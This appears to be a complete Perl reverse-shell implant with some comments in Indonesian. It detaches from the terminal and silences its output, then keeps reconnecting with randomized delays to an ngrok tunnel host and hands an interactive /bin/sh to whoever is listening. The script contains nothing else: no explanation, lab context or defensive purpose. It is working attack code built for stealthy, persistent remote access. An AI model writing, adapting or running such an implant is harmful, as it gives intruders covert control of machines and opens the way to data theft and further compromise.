#!/usr/bin/perl
use strict;
use warnings;
use Socket;
use POSIX;

# Config dengan random delay
my $server = "0.tcp.ap.ngrok.io";
my $port   = 14249;
my $min_delay = 10;
my $max_delay = 60;

# Daemonize
fork() && exit;
setsid();
fork() && exit;
chdir "/";

# Close stdio
close($_) for (*STDIN, *STDOUT, *STDERR);
open(STDIN,  "</dev/null");
open(STDOUT, ">/dev/null");
open(STDERR, ">/dev/null");

# Main loop dengan exponential backoff
my $retry_count = 0;
while (1) {
    my $socket;
    
    # Calculate delay with exponential backoff
    my $delay = $min_delay + int(rand($max_delay - $min_delay));
    $delay += $retry_count * 5;  # Tambah delay setiap retry
    
    sleep($delay);
    
    eval {
        # Create and connect
        socket($socket, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
        
        # Set timeout
        my $ip = gethostbyname($server) or die "Cannot resolve";
        my $addr = sockaddr_in($port, $ip);
        
        # Non-blocking connect attempt
        connect($socket, $addr) or die "Connection failed";
        
        # Reset retry counter on success
        $retry_count = 0;
        
        # Duplicate file descriptors
        open(STDIN,  "<&", $socket);
        open(STDOUT, ">&", $socket);
        open(STDERR, ">&", $socket);
        
        # Spawn shell
        exec("/bin/sh", "-i");
    };
    
    # Increment retry counter on failure
    $retry_count++ if $@;
    $retry_count = 10 if $retry_count > 10;  # Cap at 10
    
    # Close socket
    close($socket) if $socket;
}
